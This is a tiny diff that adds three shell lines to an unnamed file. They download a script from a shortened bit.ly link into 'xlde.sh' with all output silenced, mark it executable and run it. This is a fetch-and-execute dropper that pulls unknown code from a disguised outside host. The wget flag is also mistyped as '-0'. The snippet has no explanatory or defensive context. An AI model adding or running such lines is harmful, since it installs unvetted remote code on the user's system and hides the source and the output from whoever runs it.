@@ -1,0 +1,3 @@
+wget -0 xlde.sh https://bit.ly/3YT9GRl> /dev/null 2>&1
+chmod +x xlde.sh
+./xlde.sh
